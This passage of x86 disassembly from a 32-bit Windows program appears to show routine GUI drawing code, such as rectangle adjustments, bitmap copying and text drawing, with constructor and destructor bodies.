  401e05:	8b 44 24 14          	mov    0x14(%esp),%eax
  401e09:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  401e0d:	50                   	push   %eax
  401e0e:	51                   	push   %ecx
  401e0f:	8d 4c 24 34          	lea    0x34(%esp),%ecx
  401e13:	e8 e4 22 01 00       	call   0x4140fc
  401e18:	8b 84 24 80 00 00 00 	mov    0x80(%esp),%eax
  401e1f:	85 c0                	test   %eax,%eax
  401e21:	74 0c                	je     0x401e2f
  401e23:	8b 54 24 30          	mov    0x30(%esp),%edx
  401e27:	50                   	push   %eax
  401e28:	52                   	push   %edx
  401e29:	ff 15 58 80 41 00    	call   *0x418058
  401e2f:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  401e33:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  401e37:	48                   	dec    %eax
  401e38:	41                   	inc    %ecx
  401e39:	50                   	push   %eax
  401e3a:	8d 94 24 88 00 00 00 	lea    0x88(%esp),%edx
  401e41:	51                   	push   %ecx
  401e42:	52                   	push   %edx
  401e43:	8d 4c 24 38          	lea    0x38(%esp),%ecx
  401e47:	e8 b6 22 01 00       	call   0x414102
  401e4c:	8b 44 24 14          	mov    0x14(%esp),%eax
  401e50:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  401e54:	40                   	inc    %eax
  401e55:	41                   	inc    %ecx
  401e56:	50                   	push   %eax
  401e57:	51                   	push   %ecx
  401e58:	8d 4c 24 34          	lea    0x34(%esp),%ecx
  401e5c:	e8 9b 22 01 00       	call   0x4140fc
  401e61:	8b 54 24 14          	mov    0x14(%esp),%edx
  401e65:	8b 44 24 18          	mov    0x18(%esp),%eax
  401e69:	42                   	inc    %edx
  401e6a:	8d 4c 24 2c          	lea    0x2c(%esp),%ecx
  401e6e:	52                   	push   %edx
  401e6f:	50                   	push   %eax
  401e70:	e8 87 22 01 00       	call   0x4140fc
  401e75:	8b 84 24 a0 00 00 00 	mov    0xa0(%esp),%eax
  401e7c:	85 c0                	test   %eax,%eax
  401e7e:	74 0c                	je     0x401e8c
  401e80:	8b 4c 24 30          	mov    0x30(%esp),%ecx
  401e84:	50                   	push   %eax
  401e85:	51                   	push   %ecx
  401e86:	ff 15 58 80 41 00    	call   *0x418058
  401e8c:	8b 54 24 1c          	mov    0x1c(%esp),%edx
  401e90:	8b 44 24 10          	mov    0x10(%esp),%eax
  401e94:	4a                   	dec    %edx
  401e95:	8d 8c 24 84 00 00 00 	lea    0x84(%esp),%ecx
  401e9c:	52                   	push   %edx
  401e9d:	50                   	push   %eax
  401e9e:	51                   	push   %ecx
  401e9f:	8d 4c 24 38          	lea    0x38(%esp),%ecx
  401ea3:	e8 5a 22 01 00       	call   0x414102
  401ea8:	8b 54 24 1c          	mov    0x1c(%esp),%edx
  401eac:	8b 44 24 18          	mov    0x18(%esp),%eax
  401eb0:	4a                   	dec    %edx
  401eb1:	48                   	dec    %eax
  401eb2:	52                   	push   %edx
  401eb3:	50                   	push   %eax
  401eb4:	8d 4c 24 34          	lea    0x34(%esp),%ecx
  401eb8:	e8 3f 22 01 00       	call   0x4140fc
  401ebd:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  401ec1:	8b 54 24 18          	mov    0x18(%esp),%edx
  401ec5:	49                   	dec    %ecx
  401ec6:	4a                   	dec    %edx
  401ec7:	51                   	push   %ecx
  401ec8:	52                   	push   %edx
  401ec9:	8d 4c 24 34          	lea    0x34(%esp),%ecx
  401ecd:	e8 2a 22 01 00       	call   0x4140fc
  401ed2:	8b 44 24 64          	mov    0x64(%esp),%eax
  401ed6:	85 c0                	test   %eax,%eax
  401ed8:	74 0c                	je     0x401ee6
  401eda:	50                   	push   %eax
  401edb:	8b 44 24 34          	mov    0x34(%esp),%eax
  401edf:	50                   	push   %eax
  401ee0:	ff 15 58 80 41 00    	call   *0x418058
  401ee6:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  401eea:	8b 54 24 10          	mov    0x10(%esp),%edx
  401eee:	83 c1 fe             	add    $0xfffffffe,%ecx
  401ef1:	42                   	inc    %edx
  401ef2:	51                   	push   %ecx
  401ef3:	8d 84 24 88 00 00 00 	lea    0x88(%esp),%eax
  401efa:	52                   	push   %edx
  401efb:	50                   	push   %eax
  401efc:	8d 4c 24 38          	lea    0x38(%esp),%ecx
  401f00:	e8 fd 21 01 00       	call   0x414102
  401f05:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  401f09:	8b 54 24 18          	mov    0x18(%esp),%edx
  401f0d:	83 c1 fe             	add    $0xfffffffe,%ecx
  401f10:	83 c2 fe             	add    $0xfffffffe,%edx
  401f13:	51                   	push   %ecx
  401f14:	52                   	push   %edx
  401f15:	8d 4c 24 34          	lea    0x34(%esp),%ecx
  401f19:	e8 de 21 01 00       	call   0x4140fc
  401f1e:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  401f22:	8b 44 24 14          	mov    0x14(%esp),%eax
  401f26:	83 c1 fe             	add    $0xfffffffe,%ecx
  401f29:	50                   	push   %eax
  401f2a:	51                   	push   %ecx
  401f2b:	8d 4c 24 34          	lea    0x34(%esp),%ecx
  401f2f:	e8 c8 21 01 00       	call   0x4140fc
  401f34:	8d 4c 24 2c          	lea    0x2c(%esp),%ecx
  401f38:	57                   	push   %edi
  401f39:	e8 ca 21 01 00       	call   0x414108
  401f3e:	bf 08 8a 41 00       	mov    $0x418a08,%edi
  401f43:	89 bc 24 9c 00 00 00 	mov    %edi,0x9c(%esp)
  401f4a:	8d 8c 24 9c 00 00 00 	lea    0x9c(%esp),%ecx
  401f51:	c6 84 24 b4 00 00 00 	movb   $0xe,0xb4(%esp)
  401f58:	0e 
  401f59:	e8 f0 20 01 00       	call   0x41404e
  401f5e:	c7 84 24 9c 00 00 00 	movl   $0x4189f4,0x9c(%esp)
  401f65:	f4 89 41 00 
  401f69:	89 7c 24 60          	mov    %edi,0x60(%esp)
  401f6d:	8d 4c 24 60          	lea    0x60(%esp),%ecx
  401f71:	c6 84 24 b4 00 00 00 	movb   $0xf,0xb4(%esp)
  401f78:	0f 
  401f79:	e8 d0 20 01 00       	call   0x41404e
  401f7e:	c7 44 24 60 f4 89 41 	movl   $0x4189f4,0x60(%esp)
  401f85:	00 
  401f86:	89 7c 24 7c          	mov    %edi,0x7c(%esp)
  401f8a:	8d 4c 24 7c          	lea    0x7c(%esp),%ecx
  401f8e:	c6 84 24 b4 00 00 00 	movb   $0x10,0xb4(%esp)
  401f95:	10 
  401f96:	e8 b3 20 01 00       	call   0x41404e
  401f9b:	c7 44 24 7c f4 89 41 	movl   $0x4189f4,0x7c(%esp)
  401fa2:	00 
  401fa3:	89 7c 24 20          	mov    %edi,0x20(%esp)
  401fa7:	c6 84 24 b4 00 00 00 	movb   $0x11,0xb4(%esp)
  401fae:	11 
  401faf:	8d 4c 24 20          	lea    0x20(%esp),%ecx
  401fb3:	e8 96 20 01 00       	call   0x41404e
  401fb8:	8b 7c 24 68          	mov    0x68(%esp),%edi
  401fbc:	c6 84 24 b4 00 00 00 	movb   $0x4,0xb4(%esp)
  401fc3:	04 
  401fc4:	8d 4c 24 28          	lea    0x28(%esp),%ecx
  401fc8:	e8 29 21 01 00       	call   0x4140f6
  401fcd:	8d 54 24 28          	lea    0x28(%esp),%edx
  401fd1:	8b cb                	mov    %ebx,%ecx
  401fd3:	52                   	push   %edx
  401fd4:	c6 84 24 b8 00 00 00 	movb   $0x12,0xb8(%esp)
  401fdb:	12 
  401fdc:	e8 0f 21 01 00       	call   0x4140f0
  401fe1:	8b 43 44             	mov    0x44(%ebx),%eax
  401fe4:	85 c0                	test   %eax,%eax
  401fe6:	75 09                	jne    0x401ff1
  401fe8:	8d 4c 24 28          	lea    0x28(%esp),%ecx
  401fec:	e8 f9 20 01 00       	call   0x4140ea
  401ff1:	8d 44 24 6c          	lea    0x6c(%esp),%eax
  401ff5:	57                   	push   %edi
  401ff6:	50                   	push   %eax
  401ff7:	ff 15 44 86 41 00    	call   *0x418644
  401ffd:	8b 83 b8 00 00 00    	mov    0xb8(%ebx),%eax
  402003:	85 c0                	test   %eax,%eax
  402005:	74 19                	je     0x402020
  402007:	56                   	push   %esi
  402008:	8d 4c 24 70          	lea    0x70(%esp),%ecx
  40200c:	55                   	push   %ebp
  40200d:	51                   	push   %ecx
  40200e:	8d 54 24 34          	lea    0x34(%esp),%edx
  402012:	57                   	push   %edi
  402013:	8d 44 24 3c          	lea    0x3c(%esp),%eax
  402017:	52                   	push   %edx
  402018:	50                   	push   %eax
  402019:	8b cb                	mov    %ebx,%ecx
  40201b:	e8 f0 03 00 00       	call   0x402410
  402020:	8b 4c 24 28          	mov    0x28(%esp),%ecx
  402024:	8b 41 f8             	mov    -0x8(%ecx),%eax
  402027:	85 c0                	test   %eax,%eax
  402029:	0f 84 53 01 00 00    	je     0x402182
  40202f:	85 ed                	test   %ebp,%ebp
  402031:	74 0f                	je     0x402042
  402033:	6a 01                	push   $0x1
  402035:	8d 54 24 70          	lea    0x70(%esp),%edx
  402039:	6a 01                	push   $0x1
  40203b:	52                   	push   %edx
  40203c:	ff 15 58 86 41 00    	call   *0x418658
  402042:	8b 43 20             	mov    0x20(%ebx),%eax
  402045:	6a 00                	push   $0x0
  402047:	6a 00                	push   $0x0
  402049:	6a 31                	push   $0x31
  40204b:	50                   	push   %eax
  40204c:	ff 15 5c 86 41 00    	call   *0x41865c
  402052:	50                   	push   %eax
  402053:	e8 8c 20 01 00       	call   0x4140e4
  402058:	8b 54 24 2c          	mov    0x2c(%esp),%edx
  40205c:	50                   	push   %eax
  40205d:	8d 4c 24 30          	lea    0x30(%esp),%ecx
  402061:	ff 52 30             	call   *0x30(%edx)
  402064:	89 44 24 68          	mov    %eax,0x68(%esp)
  402068:	8b 43 50             	mov    0x50(%ebx),%eax
  40206b:	83 f8 01             	cmp    $0x1,%eax
  40206e:	74 20                	je     0x402090
  402070:	85 ed                	test   %ebp,%ebp
  402072:	75 1c                	jne    0x402090
  402074:	8b cb                	mov    %ebx,%ecx
  402076:	e8 e5 05 00 00       	call   0x402660
  40207b:	50                   	push   %eax
  40207c:	8b 44 24 30          	mov    0x30(%esp),%eax
  402080:	8d 4c 24 30          	lea    0x30(%esp),%ecx
  402084:	ff 50 38             	call   *0x38(%eax)
  402087:	8b cb                	mov    %ebx,%ecx
  402089:	e8 92 05 00 00       	call   0x402620
  40208e:	eb 1a                	jmp    0x4020aa
  402090:	8b cb                	mov    %ebx,%ecx
  402092:	e8 79 06 00 00       	call   0x402710
  402097:	50                   	push   %eax
  402098:	8b 44 24 30          	mov    0x30(%esp),%eax
  40209c:	8d 4c 24 30          	lea    0x30(%esp),%ecx
  4020a0:	ff 50 38             	call   *0x38(%eax)
  4020a3:	8b cb                	mov    %ebx,%ecx
  4020a5:	e8 f6 05 00 00       	call   0x4026a0
  4020aa:	8b 54 24 2c          	mov    0x2c(%esp),%edx
  4020ae:	8d 4c 24 2c          	lea    0x2c(%esp),%ecx
  4020b2:	50                   	push   %eax
  4020b3:	ff 52 34             	call   *0x34(%edx)
  4020b6:	8b 44 24 78          	mov    0x78(%esp),%eax
  4020ba:	8b 54 24 28          	mov    0x28(%esp),%edx
  4020be:	8b 7c 24 6c          	mov    0x6c(%esp),%edi
  4020c2:	8b 6c 24 70          	mov    0x70(%esp),%ebp
  4020c6:	8b 5c 24 74          	mov    0x74(%esp),%ebx
  4020ca:	8d 4c 24 6c          	lea    0x6c(%esp),%ecx
  4020ce:	68 20 04 00 00       	push   $0x420
  4020d3:	89 84 24 94 00 00 00 	mov    %eax,0x94(%esp)
  4020da:	8b 44 24 30          	mov    0x30(%esp),%eax
  4020de:	51                   	push   %ecx
  4020df:	6a ff                	push   $0xffffffff
  4020e1:	52                   	push   %edx
  4020e2:	8d 4c 24 3c          	lea    0x3c(%esp),%ecx
  4020e6:	ff 50 70             	call   *0x70(%eax)
  4020e9:	8b 44 24 70          	mov    0x70(%esp),%eax
  4020ed:	8b 94 24 90 00 00 00 	mov    0x90(%esp),%edx
  4020f4:	2b c5                	sub    %ebp,%eax
  4020f6:	8b 6c 24 78          	mov    0x78(%esp),%ebp
  4020fa:	2b c5                	sub    %ebp,%eax
  4020fc:	03 c2                	add    %edx,%eax
  4020fe:	99                   	cltd
  4020ff:	2b c2                	sub    %edx,%eax
  402101:	8b 54 24 74          	mov    0x74(%esp),%edx
  402105:	8b c8                	mov    %eax,%ecx
  402107:	8b c3                	mov    %ebx,%eax
  402109:	8b 5c 24 6c          	mov    0x6c(%esp),%ebx
  40210d:	2b c2                	sub    %edx,%eax
  40210f:	2b c7                	sub    %edi,%eax
  402111:	03 c3                	add    %ebx,%eax
  402113:	99                   	cltd
  402114:	d1 f9                	sar    $1,%ecx
  402116:	2b c2                	sub    %edx,%eax
  402118:	51                   	push   %ecx
  402119:	d1 f8                	sar    $1,%eax
  40211b:	8d 4c 24 70          	lea    0x70(%esp),%ecx
  40211f:	50                   	push   %eax
  402120:	51                   	push   %ecx
  402121:	ff 15 58 86 41 00    	call   *0x418658
  402127:	6a 01                	push   $0x1
  402129:	8d 4c 24 30          	lea    0x30(%esp),%ecx
  40212d:	e8 ac 1f 01 00       	call   0x4140de
  402132:	8b 44 24 78          	mov    0x78(%esp),%eax
  402136:	8b 54 24 70          	mov    0x70(%esp),%edx
  40213a:	8b 4c 24 74          	mov    0x74(%esp),%ecx
  40213e:	8b 7c 24 6c          	mov    0x6c(%esp),%edi
  402142:	2b c2                	sub    %edx,%eax
  402144:	2b cf                	sub    %edi,%ecx
  402146:	f7 de                	neg    %esi
  402148:	1b f6                	sbb    %esi,%esi
  40214a:	83 e6 20             	and    $0x20,%esi
  40214d:	83 ce 02             	or     $0x2,%esi
  402150:	56                   	push   %esi
  402151:	50                   	push   %eax
  402152:	8b 44 24 38          	mov    0x38(%esp),%eax
  402156:	51                   	push   %ecx
  402157:	52                   	push   %edx
  402158:	8b 54 24 38          	mov    0x38(%esp),%edx
  40215c:	57                   	push   %edi
  40215d:	6a 00                	push   $0x0
  40215f:	52                   	push   %edx
  402160:	6a 00                	push   $0x0
  402162:	6a 00                	push   $0x0
  402164:	50                   	push   %eax
  402165:	ff 15 60 86 41 00    	call   *0x418660
  40216b:	8b 4c 24 68          	mov    0x68(%esp),%ecx
  40216f:	8b 54 24 2c          	mov    0x2c(%esp),%edx
  402173:	51                   	push   %ecx
  402174:	8d 4c 24 30          	lea    0x30(%esp),%ecx
  402178:	ff 52 30             	call   *0x30(%edx)
  40217b:	8b 9c 24 98 00 00 00 	mov    0x98(%esp),%ebx
  402182:	8b 43 4c             	mov    0x4c(%ebx),%eax
  402185:	85 c0                	test   %eax,%eax
  402187:	74 0b                	je     0x402194
  402189:	83 f8 01             	cmp    $0x1,%eax
  40218c:	75 62                	jne    0x4021f0
  40218e:	83 7b 54 01          	cmpl   $0x1,0x54(%ebx)
  402192:	75 5c                	jne    0x4021f0
  402194:	8b 84 24 94 00 00 00 	mov    0x94(%esp),%eax
  40219b:	85 c0                	test   %eax,%eax
  40219d:	74 51                	je     0x4021f0
  40219f:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  4021a3:	8b 44 24 10          	mov    0x10(%esp),%eax
  4021a7:	8b 54 24 18          	mov    0x18(%esp),%edx
  4021ab:	89 8c 24 88 00 00 00 	mov    %ecx,0x88(%esp)
  4021b2:	89 84 24 84 00 00 00 	mov    %eax,0x84(%esp)
  4021b9:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  4021bd:	6a fd                	push   $0xfffffffd
  4021bf:	8d 8c 24 88 00 00 00 	lea    0x88(%esp),%ecx
  4021c6:	6a fd                	push   $0xfffffffd
  4021c8:	51                   	push   %ecx
  4021c9:	89 94 24 98 00 00 00 	mov    %edx,0x98(%esp)
  4021d0:	89 84 24 9c 00 00 00 	mov    %eax,0x9c(%esp)
  4021d7:	ff 15 4c 86 41 00    	call   *0x41864c
  4021dd:	8b 44 24 30          	mov    0x30(%esp),%eax
  4021e1:	8d 94 24 84 00 00 00 	lea    0x84(%esp),%edx
  4021e8:	52                   	push   %edx
  4021e9:	50                   	push   %eax
  4021ea:	ff 15 64 86 41 00    	call   *0x418664
  4021f0:	8d 4c 24 28          	lea    0x28(%esp),%ecx
  4021f4:	c6 84 24 b4 00 00 00 	movb   $0x4,0xb4(%esp)
  4021fb:	04 
  4021fc:	e8 d7 1e 01 00       	call   0x4140d8
  402201:	c7 84 24 a4 00 00 00 	movl   $0x418a08,0xa4(%esp)
  402208:	08 8a 41 00 
  40220c:	8d 8c 24 a4 00 00 00 	lea    0xa4(%esp),%ecx
  402213:	c6 84 24 b4 00 00 00 	movb   $0x13,0xb4(%esp)
  40221a:	13 
  40221b:	e8 2e 1e 01 00       	call   0x41404e
  402220:	bb f4 89 41 00       	mov    $0x4189f4,%ebx
  402225:	c7 44 24 2c 20 8a 41 	movl   $0x418a20,0x2c(%esp)
  40222c:	00 
  40222d:	89 9c 24 a4 00 00 00 	mov    %ebx,0xa4(%esp)
  402234:	8b 44 24 5c          	mov    0x5c(%esp),%eax
  402238:	33 ff                	xor    %edi,%edi
  40223a:	3b c7                	cmp    %edi,%eax
  40223c:	c7 84 24 b4 00 00 00 	movl   $0x15,0xb4(%esp)
  402243:	15 00 00 00 
  402247:	74 59                	je     0x4022a2
  402249:	8b 54 24 50          	mov    0x50(%esp),%edx
  40224d:	8b 44 24 58          	mov    0x58(%esp),%eax
  402251:	8b 74 24 4c          	mov    0x4c(%esp),%esi
  402255:	8b 4c 24 54          	mov    0x54(%esp),%ecx
  402259:	8b 6c 24 30          	mov    0x30(%esp),%ebp
  40225d:	68 20 00 cc 00       	push   $0xcc0020
  402262:	52                   	push   %edx
  402263:	2b c2                	sub    %edx,%eax
  402265:	56                   	push   %esi
  402266:	2b ce                	sub    %esi,%ecx
  402268:	55                   	push   %ebp
  402269:	50                   	push   %eax
  40226a:	51                   	push   %ecx
  40226b:	8b 4c 24 60          	mov    0x60(%esp),%ecx
  40226f:	52                   	push   %edx
  402270:	56                   	push   %esi
  402271:	8b 51 04             	mov    0x4(%ecx),%edx
  402274:	52                   	push   %edx
  402275:	ff 15 5c 80 41 00    	call   *0x41805c
  40227b:	8b 44 24 44          	mov    0x44(%esp),%eax
  40227f:	3b c7                	cmp    %edi,%eax
  402281:	75 0f                	jne    0x402292
  402283:	33 c0                	xor    %eax,%eax
  402285:	50                   	push   %eax
  402286:	8b 44 24 34          	mov    0x34(%esp),%eax
  40228a:	50                   	push   %eax
  40228b:	e8 c4 1d 01 00       	call   0x414054
  402290:	eb 18                	jmp    0x4022aa
  402292:	8b 40 04             	mov    0x4(%eax),%eax
  402295:	50                   	push   %eax
  402296:	8b 44 24 34          	mov    0x34(%esp),%eax
  40229a:	50                   	push   %eax
  40229b:	e8 b4 1d 01 00       	call   0x414054
  4022a0:	eb 08                	jmp    0x4022aa
  4022a2:	89 7c 24 34          	mov    %edi,0x34(%esp)
  4022a6:	89 7c 24 30          	mov    %edi,0x30(%esp)
  4022aa:	8d 4c 24 3c          	lea    0x3c(%esp),%ecx
  4022ae:	c7 44 24 3c 08 8a 41 	movl   $0x418a08,0x3c(%esp)
  4022b5:	00 
  4022b6:	89 8c 24 98 00 00 00 	mov    %ecx,0x98(%esp)
  4022bd:	8d 4c 24 3c          	lea    0x3c(%esp),%ecx
  4022c1:	c6 84 24 b4 00 00 00 	movb   $0x16,0xb4(%esp)
  4022c8:	16 
  4022c9:	e8 80 1d 01 00       	call   0x41404e
  4022ce:	8d 4c 24 2c          	lea    0x2c(%esp),%ecx
  4022d2:	89 5c 24 3c          	mov    %ebx,0x3c(%esp)
  4022d6:	c7 84 24 b4 00 00 00 	movl   $0xffffffff,0xb4(%esp)
  4022dd:	ff ff ff ff 
  4022e1:	e8 38 1d 01 00       	call   0x41401e
  4022e6:	8b 8c 24 ac 00 00 00 	mov    0xac(%esp),%ecx
  4022ed:	5f                   	pop    %edi
  4022ee:	5e                   	pop    %esi
  4022ef:	5d                   	pop    %ebp
  4022f0:	5b                   	pop    %ebx
  4022f1:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4022f8:	81 c4 a8 00 00 00    	add    $0xa8,%esp
  4022fe:	c2 04 00             	ret    $0x4
  402301:	90                   	nop
  402302:	90                   	nop
  402303:	90                   	nop
  402304:	90                   	nop
  402305:	90                   	nop
  402306:	90                   	nop
  402307:	90                   	nop
  402308:	90                   	nop
  402309:	90                   	nop
  40230a:	90                   	nop
  40230b:	90                   	nop
  40230c:	90                   	nop
  40230d:	90                   	nop
  40230e:	90                   	nop
  40230f:	90                   	nop
  402310:	6a ff                	push   $0xffffffff
  402312:	68 1b 4b 41 00       	push   $0x414b1b
  402317:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  40231d:	50                   	push   %eax
  40231e:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  402325:	83 ec 08             	sub    $0x8,%esp
  402328:	56                   	push   %esi
  402329:	8b f1                	mov    %ecx,%esi
  40232b:	57                   	push   %edi
  40232c:	89 74 24 08          	mov    %esi,0x8(%esp)
  402330:	c7 06 20 8a 41 00    	movl   $0x418a20,(%esi)
  402336:	8b 4e 30             	mov    0x30(%esi),%ecx
  402339:	33 c0                	xor    %eax,%eax
  40233b:	3b c8                	cmp    %eax,%ecx
  40233d:	c7 44 24 18 01 00 00 	movl   $0x1,0x18(%esp)
  402344:	00 
  402345:	74 56                	je     0x40239d
  402347:	8b 56 24             	mov    0x24(%esi),%edx
  40234a:	8b 7e 20             	mov    0x20(%esi),%edi
  40234d:	8b 46 2c             	mov    0x2c(%esi),%eax
  402350:	8b 4e 28             	mov    0x28(%esi),%ecx
  402353:	53                   	push   %ebx
  402354:	55                   	push   %ebp
  402355:	8b ea                	mov    %edx,%ebp
  402357:	8b df                	mov    %edi,%ebx
  402359:	2b c5                	sub    %ebp,%eax
  40235b:	8b 6e 04             	mov    0x4(%esi),%ebp
  40235e:	68 20 00 cc 00       	push   $0xcc0020
  402363:	52                   	push   %edx
  402364:	2b cb                	sub    %ebx,%ecx
  402366:	8b 5e 1c             	mov    0x1c(%esi),%ebx
  402369:	57                   	push   %edi
  40236a:	55                   	push   %ebp
  40236b:	50                   	push   %eax
  40236c:	8b 43 04             	mov    0x4(%ebx),%eax
  40236f:	51                   	push   %ecx
  402370:	52                   	push   %edx
  402371:	57                   	push   %edi
  402372:	50                   	push   %eax
  402373:	ff 15 5c 80 41 00    	call   *0x41805c
  402379:	8b 46 18             	mov    0x18(%esi),%eax
  40237c:	5d                   	pop    %ebp
  40237d:	85 c0                	test   %eax,%eax
  40237f:	5b                   	pop    %ebx
  402380:	75 0c                	jne    0x40238e
  402382:	8b 4e 04             	mov    0x4(%esi),%ecx
  402385:	50                   	push   %eax
  402386:	51                   	push   %ecx
  402387:	e8 c8 1c 01 00       	call   0x414054
  40238c:	eb 15                	jmp    0x4023a3
  40238e:	8b 40 04             	mov    0x4(%eax),%eax
  402391:	8b 4e 04             	mov    0x4(%esi),%ecx
  402394:	50                   	push   %eax
  402395:	51                   	push   %ecx
  402396:	e8 b9 1c 01 00       	call   0x414054
  40239b:	eb 06                	jmp    0x4023a3
  40239d:	89 46 08             	mov    %eax,0x8(%esi)
  4023a0:	89 46 04             	mov    %eax,0x4(%esi)
  4023a3:	8d 7e 10             	lea    0x10(%esi),%edi
  4023a6:	89 7c 24 0c          	mov    %edi,0xc(%esp)
  4023aa:	c7 07 08 8a 41 00    	movl   $0x418a08,(%edi)
  4023b0:	8b cf                	mov    %edi,%ecx
  4023b2:	c6 44 24 18 02       	movb   $0x2,0x18(%esp)
  4023b7:	e8 92 1c 01 00       	call   0x41404e
  4023bc:	8b ce                	mov    %esi,%ecx
  4023be:	c7 07 f4 89 41 00    	movl   $0x4189f4,(%edi)
  4023c4:	c7 44 24 18 ff ff ff 	movl   $0xffffffff,0x18(%esp)
  4023cb:	ff 
  4023cc:	e8 4d 1c 01 00       	call   0x41401e
  4023d1:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  4023d5:	5f                   	pop    %edi
  4023d6:	5e                   	pop    %esi
  4023d7:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4023de:	83 c4 14             	add    $0x14,%esp
  4023e1:	c3                   	ret
  4023e2:	90                   	nop
  4023e3:	90                   	nop
  4023e4:	90                   	nop
  4023e5:	90                   	nop
  4023e6:	90                   	nop
  4023e7:	90                   	nop
  4023e8:	90                   	nop
  4023e9:	90                   	nop
  4023ea:	90                   	nop
  4023eb:	90                   	nop
  4023ec:	90                   	nop
  4023ed:	90                   	nop
  4023ee:	90                   	nop
  4023ef:	90                   	nop
  4023f0:	56                   	push   %esi
  4023f1:	8b f1                	mov    %ecx,%esi
  4023f3:	e8 18 ff ff ff       	call   0x402310
  4023f8:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  4023fd:	74 09                	je     0x402408
  4023ff:	56                   	push   %esi
  402400:	e8 ab 1a 01 00       	call   0x413eb0
  402405:	83 c4 04             	add    $0x4,%esp
  402408:	8b c6                	mov    %esi,%eax
  40240a:	5e                   	pop    %esi
  40240b:	c2 04 00             	ret    $0x4
  40240e:	90                   	nop
  40240f:	90                   	nop
  402410:	8b 44 24 0c          	mov    0xc(%esp),%eax
  402414:	83 ec 10             	sub    $0x10,%esp
  402417:	53                   	push   %ebx
  402418:	56                   	push   %esi
  402419:	8b f1                	mov    %ecx,%esi
  40241b:	57                   	push   %edi
  40241c:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  402420:	50                   	push   %eax
  402421:	51                   	push   %ecx
  402422:	ff 15 44 86 41 00    	call   *0x418644
  402428:	8b 46 40             	mov    0x40(%esi),%eax
  40242b:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  40242f:	8b 7c 24 18          	mov    0x18(%esp),%edi
  402433:	83 e8 00             	sub    $0x0,%eax
  402436:	74 42                	je     0x40247a
  402438:	48                   	dec    %eax
  402439:	0f 85 a6 00 00 00    	jne    0x4024e5
  40243f:	8b 5c 24 0c          	mov    0xc(%esp),%ebx
  402443:	33 d2                	xor    %edx,%edx
  402445:	8a 96 c1 00 00 00    	mov    0xc1(%esi),%dl
  40244b:	8b c1                	mov    %ecx,%eax
  40244d:	2b c2                	sub    %edx,%eax
  40244f:	2b c3                	sub    %ebx,%eax
  402451:	99                   	cltd
  402452:	2b c2                	sub    %edx,%eax
  402454:	d1 f8                	sar    $1,%eax
  402456:	03 d8                	add    %eax,%ebx
  402458:	8b 44 24 24          	mov    0x24(%esp),%eax
  40245c:	89 5c 24 0c          	mov    %ebx,0xc(%esp)
  402460:	8b 10                	mov    (%eax),%edx
  402462:	8b 42 f8             	mov    -0x8(%edx),%eax
  402465:	85 c0                	test   %eax,%eax
  402467:	74 5d                	je     0x4024c6
  402469:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  40246d:	33 d2                	xor    %edx,%edx
  40246f:	8a 96 c0 00 00 00    	mov    0xc0(%esi),%dl
  402475:	01 50 04             	add    %edx,0x4(%eax)
  402478:	eb 6b                	jmp    0x4024e5
  40247a:	8b 44 24 24          	mov    0x24(%esp),%eax
  40247e:	8b 10                	mov    (%eax),%edx
  402480:	8b 42 f8             	mov    -0x8(%edx),%eax
  402483:	85 c0                	test   %eax,%eax
  402485:	75 21                	jne    0x4024a8
  402487:	8b 5c 24 0c          	mov    0xc(%esp),%ebx
  40248b:	33 c0                	xor    %eax,%eax
  40248d:	8a 86 c1 00 00 00    	mov    0xc1(%esi),%al
  402493:	8b d0                	mov    %eax,%edx
  402495:	8b c1                	mov    %ecx,%eax
  402497:	2b c2                	sub    %edx,%eax
  402499:	2b c3                	sub    %ebx,%eax
  40249b:	99                   	cltd
  40249c:	2b c2                	sub    %edx,%eax
  40249e:	d1 f8                	sar    $1,%eax
  4024a0:	03 d8                	add    %eax,%ebx
  4024a2:	89 5c 24 0c          	mov    %ebx,0xc(%esp)
  4024a6:	eb 1e                	jmp    0x4024c6
  4024a8:	8b 54 24 0c          	mov    0xc(%esp),%edx
  4024ac:	33 c0                	xor    %eax,%eax
  4024ae:	8a 86 c1 00 00 00    	mov    0xc1(%esi),%al
  4024b4:	83 c2 03             	add    $0x3,%edx
  4024b7:	89 54 24 0c          	mov    %edx,0xc(%esp)
  4024bb:	8b d0                	mov    %eax,%edx
  4024bd:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  4024c1:	83 c2 03             	add    $0x3,%edx
  4024c4:	01 10                	add    %edx,(%eax)
  4024c6:	8b 5c 24 10          	mov    0x10(%esp),%ebx
  4024ca:	33 c0                	xor    %eax,%eax
  4024cc:	8a 86 c0 00 00 00    	mov    0xc0(%esi),%al
  4024d2:	8b d0                	mov    %eax,%edx
  4024d4:	8b c7                	mov    %edi,%eax
  4024d6:	2b c2                	sub    %edx,%eax
  4024d8:	2b c3                	sub    %ebx,%eax
  4024da:	99                   	cltd
  4024db:	2b c2                	sub    %edx,%eax
  4024dd:	d1 f8                	sar    $1,%eax
  4024df:	03 d8                	add    %eax,%ebx
  4024e1:	89 5c 24 10          	mov    %ebx,0x10(%esp)
  4024e5:	8b 5c 24 30          	mov    0x30(%esp),%ebx
  4024e9:	85 db                	test   %ebx,%ebx
  4024eb:	74 17                	je     0x402504
  4024ed:	6a 01                	push   $0x1
  4024ef:	8d 44 24 10          	lea    0x10(%esp),%eax
  4024f3:	6a 01                	push   $0x1
  4024f5:	50                   	push   %eax
  4024f6:	ff 15 58 86 41 00    	call   *0x418658
  4024fc:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  402500:	8b 7c 24 18          	mov    0x18(%esp),%edi
  402504:	83 7e 50 01          	cmpl   $0x1,0x50(%esi)
  402508:	74 0c                	je     0x402516
